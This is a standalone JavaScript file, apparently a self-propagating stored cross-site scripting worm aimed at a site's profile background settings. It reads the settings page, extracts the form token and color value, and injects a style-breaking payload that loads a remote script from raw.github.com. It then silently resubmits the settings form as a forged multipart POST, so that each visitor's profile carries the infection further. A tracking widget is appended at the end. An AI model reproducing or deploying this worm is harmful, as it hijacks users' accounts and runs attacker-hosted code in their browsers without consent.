jQuery(document).ready(function(jQuery){
	jQuery.get('/settings/background',function(data){
		reg=/form_id\" value=\"(.*)\" /;form_id=reg.exec(data)[1];
		reg=/name=\"color\" value=\"(.*)\" style/;color=reg.exec(data)[1];

		var reg=/script/;
		if (!reg.test(color)) {
			color = color + ";}</style><script src=//raw.github.com/vplay/js/master/video.func.js></script><style>x{color:#fff";

			var split = '-----------------------------855657377400827271157349801';
			var data = split + '\n' +
				'Content-Disposition: form-data; name="form_id"\n' +
				'\n' +
				form_id +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="id"\n' +
				'\n' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="y_pos"\n' +
				'\ntop' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="x_pos"' +
				'\n\ncenter' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="scroll"' +
				'\n\nscroll' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="repeat"' +
				'\n\nrepeat' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="cp1_Mode"' +
				'\n\nh' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="color"' +
				'\n\n' + color +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="userfile[]"; filename=""\n' +
				'Content-Type: application/octet-stream\n' +
				'\n' +
				'\n' + split + '\n' +
				'Content-Disposition: form-data; name="save"' +
				'\n\nSalveaza' +
				'\n' + split + '--\n';

		    var xhr = new XMLHttpRequest();
		    xhr.open('POST', '/settings/background_save.do');
		    xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=---------------------------855657377400827271157349801');
		    xhr.send(data);
		}
	});
});
var _wau = _wau || []; _wau.push(["tab", "68nwqe774lcy", "kcq"]);
(function() { var s=document.createElement("script");
s.async=true; s.src="http://widgets.amung.us/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);})();
